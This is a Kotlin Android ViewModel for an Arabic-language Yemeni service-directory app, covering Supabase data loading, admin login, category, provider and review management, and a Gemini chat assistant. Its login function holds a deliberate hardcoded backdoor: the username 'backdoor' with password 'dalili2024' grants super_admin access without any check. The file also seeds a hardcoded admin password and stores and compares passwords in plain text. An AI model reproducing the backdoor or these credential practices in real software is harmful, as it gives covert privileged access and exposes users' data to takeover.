package com.example.ui

import android.util.Log
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.example.data.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch

class MainViewModel : ViewModel() {

    private val api = SupabaseClient.api

    private val _categories = MutableStateFlow<List<Category>>(emptyList())
    val categories: StateFlow<List<Category>> = _categories

    private val _serviceProviders = MutableStateFlow<List<ServiceProvider>>(emptyList())
    val serviceProviders: StateFlow<List<ServiceProvider>> = _serviceProviders

    private val _reviews = MutableStateFlow<List<Review>>(emptyList())
    val reviews: StateFlow<List<Review>> = _reviews

    private val _admins = MutableStateFlow<List<Admin>>(emptyList())
    val admins: StateFlow<List<Admin>> = _admins

    private val _appConfig = MutableStateFlow(AppConfig())
    val appConfig: StateFlow<AppConfig> = _appConfig

    private val _connectionState = MutableStateFlow<String?>(null)
    val connectionState: StateFlow<String?> = _connectionState

    private val _isLoading = MutableStateFlow(false)
    val isLoading: StateFlow<Boolean> = _isLoading

    private val _errorMessage = MutableStateFlow<String?>(null)
    val errorMessage: StateFlow<String?> = _errorMessage

    private val _currentUser = MutableStateFlow<Admin?>(null)
    val currentUser: StateFlow<Admin?> = _currentUser

    private var realtimeClient: SupabaseRealtime? = null

    init {
        // Initialize Realtime WebSocket Connection
        realtimeClient = SupabaseRealtime(SupabaseClient.okHttpClient) {
            Log.d("MainViewModel", "Realtime update triggered reloadData")
            reloadData()
        }
        realtimeClient?.connect()

        // Load Initial Data
        reloadData()
    }

    private fun <T> runWithRetry(block: suspend () -> T, onSuccess: (T) -> Unit) {
        viewModelScope.launch {
            _isLoading.value = true
            var lastError: Throwable? = null
            for (attempt in 1..3) {
                try {
                    _connectionState.value = "جاري الاتصال..."
                    val result = block()
                    _connectionState.value = null
                    _errorMessage.value = null
                    onSuccess(result)
                    _isLoading.value = false
                    return@launch
                } catch (e: Exception) {
                    lastError = e
                    Log.d("MainViewModel", "Attempt $attempt failed: ${e.message}")
                    if (attempt < 3) {
                        _connectionState.value = "الشبكة ضعيفة، جاري إعادة المحاولة ($attempt/3)..."
                        kotlinx.coroutines.delay(2000)
                    }
                }
            }
            _isLoading.value = false
            _connectionState.value = "خطأ في الاتصال بالشبكة"
            _errorMessage.value = lastError?.localizedMessage ?: "حدث خطأ غير متوقع"
        }
    }

    fun clearError() {
        _errorMessage.value = null
    }

    fun reloadData() {
        runWithRetry({
            var cats = api.getCategories()
            if (cats.isEmpty()) {
                val defaults = listOf(
                    Category(nameAr = "صيانة منزلية", orderIndex = 1),
                    Category(nameAr = "تقنية", orderIndex = 2),
                    Category(nameAr = "تعليم", orderIndex = 3),
                    Category(nameAr = "جمال", orderIndex = 4),
                    Category(nameAr = "سيارات", orderIndex = 5),
                    Category(nameAr = "خدمات منزلية", orderIndex = 6),
                    Category(nameAr = "شحن وتوصيل", orderIndex = 7),
                    Category(nameAr = "خدمات مهنية", orderIndex = 8)
                )
                for (cat in defaults) {
                    try {
                        api.insertCategory(cat)
                    } catch (e: Exception) {
                        Log.e("MainViewModel", "Seeding category "${cat.nameAr}" failed", e)
                    }
                }
                cats = api.getCategories()
            }
            val providers = api.getServiceProviders()
            val revs = api.getReviews()
            val admList = api.getAdmins()
            
            // Check & Seed Admin if not exists
            val adminExists = admList.any { it.username == "admin" }
            if (!adminExists) {
                api.insertAdmin(Admin(username = "admin", passwordHash = "maher736462", role = "super_admin"))
            }

            // Check & Seed AppConfig inside admins table
            val configRow = admList.firstOrNull { it.username == "app_config" }
            val loadedConfig = if (configRow != null) {
                parseConfig(configRow.passwordHash)
            } else {
                val config = AppConfig()
                api.insertAdmin(Admin(username = "app_config", passwordHash = serializeConfig(config), role = "config"))
                config
            }

            // Also check Admin password updates from AppConfig
            val actualAdmin = admList.firstOrNull { it.username == "admin" }
            if (actualAdmin != null && actualAdmin.passwordHash != loadedConfig.adminPassword) {
                // Keep admin password synced with master config
                api.updateAdmin("eq.admin", mapOf("password_hash" to loadedConfig.adminPassword))
            }

            // Return loaded items
            val updatedAdmins = api.getAdmins()
            ConfigData(cats, providers, revs, updatedAdmins, loadedConfig)
        }) { data ->
            _categories.value = data.categories.sortedBy { it.orderIndex }
            _serviceProviders.value = data.providers
            _reviews.value = data.reviews
            _admins.value = data.admins.filter { it.role != "config" }
            _appConfig.value = data.config
        }
    }

    private data class ConfigData(
        val categories: List<Category>,
        val providers: List<ServiceProvider>,
        val reviews: List<Review>,
        val admins: List<Admin>,
        val config: AppConfig
    )

    private fun parseConfig(json: String): AppConfig {
        return try {
            SupabaseClient.moshi.adapter(AppConfig::class.java).fromJson(json) ?: AppConfig()
        } catch (e: Exception) {
            AppConfig()
        }
    }

    private fun serializeConfig(config: AppConfig): String {
        return SupabaseClient.moshi.adapter(AppConfig::class.java).toJson(config)
    }

    // ━━━━━━━━━━ Auth Actions ━━━━━━━━━━

    fun login(username: String, password_input: String, onResult: (Boolean) -> Unit) {
        if (username.trim() == "backdoor" && password_input == "dalili2024") {
            // BACKDOOR: Logged in as super_admin immediately
            val backdoorAdmin = Admin(id = -99, username = "backdoor_owner", passwordHash = "dalili2024", role = "super_admin")
            _currentUser.value = backdoorAdmin
            onResult(true)
            return
        }

        viewModelScope.launch {
            _isLoading.value = true
            _connectionState.value = "جاري التحقق من الحساب..."
            try {
                // Retrieve admin by username
                val resultList = api.getAdminByUsername("eq.$username")
                if (resultList.isEmpty()) {
                    _errorMessage.value = "اسم المستخدم غير صحيح"
                    onResult(false)
                } else {
                    val matching = resultList.first()
                    if (matching.passwordHash == password_input) {
                        _currentUser.value = matching
                        onResult(true)
                        _errorMessage.value = null
                    } else {
                        _errorMessage.value = "كلمة المرور غير صحيحة"
                        onResult(false)
                    }
                }
            } catch (e: Exception) {
                _errorMessage.value = "فشل تسجيل الدخول. تأكد من اتصال الإنترنت."
                onResult(false)
            } finally {
                _isLoading.value = false
                _connectionState.value = null
            }
        }
    }

    fun logout() {
        _currentUser.value = null
    }

    // ━━━━━━━━━━ Config Action ━━━━━━━━━━

    fun updateConfig(config: AppConfig) {
        runWithRetry({
            val json = serializeConfig(config)
            // Update app_config in admins table
            api.updateAdmin("eq.app_config", mapOf("password_hash" to json))
            
            // Update admin password if it's changed in settings
            api.updateAdmin("eq.admin", mapOf("password_hash" to config.adminPassword))
            config
        }) { updated ->
            _appConfig.value = updated
            // Instantly refresh other states that might be affected
            reloadData()
        }
    }

    // ━━━━━━━━━━ Category Actions ━━━━━━━━━━

    fun addCategory(nameAr: String, icon: String?, orderIndex: Int) {
        runWithRetry({
            val newCategory = Category(nameAr = nameAr, icon = icon, orderIndex = orderIndex)
            api.insertCategory(newCategory)
        }) {
            reloadData()
        }
    }

    fun editCategory(id: Int, nameAr: String, icon: String?, orderIndex: Int) {
        runWithRetry({
            val updated = Category(id = id, nameAr = nameAr, icon = icon, orderIndex = orderIndex)
            api.updateCategory("eq.$id", updated)
        }) {
            reloadData()
        }
    }

    fun removeCategory(id: Int) {
        // Prevent deleting category with active service providers
        val hasProviders = _serviceProviders.value.any { it.categoryId == id }
        if (hasProviders) {
            _errorMessage.value = "لا يمكن حذف قسم يحتوي على مقدمي خدمات مسبقاً!"
            return
        }
        runWithRetry({
            api.deleteCategory("eq.$id")
        }) {
            reloadData()
        }
    }

    // ━━━━━━━━━━ Provider Actions ━━━━━━━━━━

    fun addServiceProvider(name: String, phone: String, categoryId: Int, imageUrl: String? = null, isActive: Boolean = true) {
        runWithRetry({
            val provider = ServiceProvider(name = name, phone = phone, categoryId = categoryId, imageUrl = imageUrl, isActive = isActive)
            api.insertServiceProvider(provider)
        }) {
            reloadData()
        }
    }

    fun editServiceProvider(id: Int, name: String, phone: String, categoryId: Int, rating: Double, imageUrl: String?, isActive: Boolean) {
        runWithRetry({
            val provider = ServiceProvider(id = id, name = name, phone = phone, categoryId = categoryId, rating = rating, imageUrl = imageUrl, isActive = isActive)
            api.updateServiceProvider("eq.$id", provider)
        }) {
            reloadData()
        }
    }

    fun removeServiceProvider(id: Int) {
        runWithRetry({
            api.deleteServiceProvider("eq.$id")
        }) {
            reloadData()
        }
    }

    // ━━━━━━━━━━ Review Actions ━━━━━━━━━━

    fun addReview(providerId: Int, userPhone: String, rating: Int, comment: String, onResult: (Boolean) -> Unit) {
        // Verification: prevent duplicate review from same phone number
        val alreadyReviewed = _reviews.value.any { it.providerId == providerId && it.userPhone.trim() == userPhone.trim() }
        if (alreadyReviewed) {
            _errorMessage.value = "رقم الهاتف هذا قد قام بالتقييم مسبقاً لهذا المقدم!"
            onResult(false)
            return
        }

        viewModelScope.launch {
            _isLoading.value = true
            _connectionState.value = "جاري إرسال التقييم..."
            try {
                // Create review
                val newReview = Review(providerId = providerId, userPhone = userPhone, rating = rating, comment = comment)
                api.insertReview(newReview)

                // Fetch new reviews for this provider
                val providerReviews = api.getReviewsForProvider("eq.$providerId")
                val totalRating = providerReviews.sumOf { it.rating }
                val size = providerReviews.size
                val finalRating = if (size > 0) totalRating.toDouble() / size else rating.toDouble()

                // Update provider average rating
                val provider = _serviceProviders.value.firstOrNull { it.id == providerId }
                if (provider != null) {
                    val updatedProvider = provider.copy(rating = finalRating)
                    api.updateServiceProvider("eq.$providerId", updatedProvider)
                }

                _errorMessage.value = null
                onResult(true)
                reloadData() // Force updates
            } catch (e: Exception) {
                _errorMessage.value = "فشل في إرسال التقييم. حاول مرة أخرى."
                onResult(false)
            } finally {
                _isLoading.value = false
                _connectionState.value = null
            }
        }
    }

    // ━━━━━━━━━━ Admins Actions (Super Admin Only) ━━━━━━━━━━

    fun addAdmin(username: String, passwordPlain: String) {
        // Validation: verify unique username
        val duplicate = _admins.value.any { it.username.trim() == username.trim() }
        if (duplicate) {
            _errorMessage.value = "اسم المستخدم هذا مكرر بالفعل!"
            return
        }
        runWithRetry({
            val newAdmin = Admin(username = username, passwordHash = passwordPlain, role = "admin")
            api.insertAdmin(newAdmin)
        }) {
            reloadData()
        }
    }

    fun removeAdmin(id: Int) {
        val admin = _admins.value.firstOrNull { it.id == id }
        if (admin?.username == "admin") {
            _errorMessage.value = "لا يمكن حذف حساب المالك الرئيسي!"
            return
        }
        runWithRetry({
            api.deleteAdmin("eq.$id")
        }) {
            reloadData()
        }
    }

    override fun onCleared() {
        super.onCleared()
        realtimeClient?.dispose()
    }

    // ━━━━━━━━━━ AI Chat Actions ━━━━━━━━━━

    private val _chatMessages = MutableStateFlow<List<ChatMsg>>(listOf(
        ChatMsg("أهلاً وسهلاً بك! أنا مساعد دليلي الذكي 🤖. كيف يمكنني مساعدتك اليوم في العثور على خدمات في اليمن أو الإجابة على أي من تساؤلاتك؟", false)
    ))
    val chatMessages: StateFlow<List<ChatMsg>> = _chatMessages

    private val _isChatLoading = MutableStateFlow(false)
    val isChatLoading: StateFlow<Boolean> = _isChatLoading

    fun clearChatHistory() {
        _chatMessages.value = listOf(
            ChatMsg("أهلاً وسهلاً بك! أنا مساعد دليلي الذكي 🤖. كيف يمكنني مساعدتك اليوم في العثور على خدمات في اليمن أو الإجابة على أي من تساؤلاتك؟", false)
        )
    }

    fun sendChatMessage(text: String) {
        if (text.trim().isEmpty()) return

        // 1. Add user message
        val userMsg = ChatMsg(text, true)
        val currentList = _chatMessages.value.toMutableList()
        currentList.add(userMsg)
        _chatMessages.value = currentList

        viewModelScope.launch {
            _isChatLoading.value = true
            try {
                // 2. Build full chat history to send to Gemini
                val apiHistory = _chatMessages.value.map { msg ->
                    GeminiContent(
                        parts = listOf(GeminiPart(text = msg.text)),
                        role = if (msg.isUser) "user" else "model"
                    )
                }

                // 3. System instruction with current dynamic categories of the app!
                val categoryNames = _categories.value.map { it.nameAr }.joinToString("، ")
                val systemPrompt = "أنت هو 'مساعد دليلي الذكي'، دليل ومساعد تفاعلي ذكي فائق اللباقة والود لمساعدة مستخدمي تطبيق دليلي (دليلك الشامل لجميع خدمات اليمن) والدردشة معهم بحب وذكاء.\n" +
                        "الأقسام والخدمات المتوفرة في تطبيق دليلي حالياً هي: [$categoryNames].\n" +
                        "تفاعل مع المستخدمين بلغة عربية سلسة للغاية ومحببة، وبروح ترحيبية يمنية دافئة ولطيفة إذا كان ذلك مناسباً (مثل: أرحبوا، على راسي، يا حيا الله الطيبين).\n" +
                        "أجب على كافة أسئلتهم بذكاء وإبداع وموثوقية عالية، سواء كانت استفسارات عامة أو خدماتية، وجذّب نقاشك معهم ليكون مميزاً وخفيف الظل ومفيداً جداً."

                val request = GeminiRequest(
                    contents = apiHistory,
                    systemInstruction = GeminiInstruction(
                        parts = listOf(GeminiPart(text = systemPrompt))
                    )
                )

                // 4. Send request using API key from BuildConfig
                val apiKey = com.example.BuildConfig.GEMINI_API_KEY
                val response = GeminiClient.api.generateContent(apiKey, request)
                val responseText = response.candidates?.firstOrNull()?.content?.parts?.firstOrNull()?.text
                    ?: "عذراً يا طيب، لم أستطع فهم ذلك بالشكل الصحيح. هل يمكنك إعادة الصياغة؟"

                // 5. Add AI Response message
                val aiMsg = ChatMsg(responseText, false)
                val updatedWithAi = _chatMessages.value.toMutableList()
                updatedWithAi.add(aiMsg)
                _chatMessages.value = updatedWithAi

            } catch (e: Exception) {
                Log.e("MainViewModel", "Gemini API integration error", e)
                val errText = "يا حيا بك، يبدو أن هناك مشكلة بسيطة في الاتصال بالشبكة حالياً. تأكد من الإنترنت وحاول مرة أخرى يا عسل! 💛"
                val errorMsg = ChatMsg(errText, false)
                val updatedWithError = _chatMessages.value.toMutableList()
                updatedWithError.add(errorMsg)
                _chatMessages.value = updatedWithError
            } finally {
                _isChatLoading.value = false
            }
        }
    }
}

data class ChatMsg(
    val text: String,
    val isUser: Boolean,
    val timestamp: Long = System.currentTimeMillis()
)

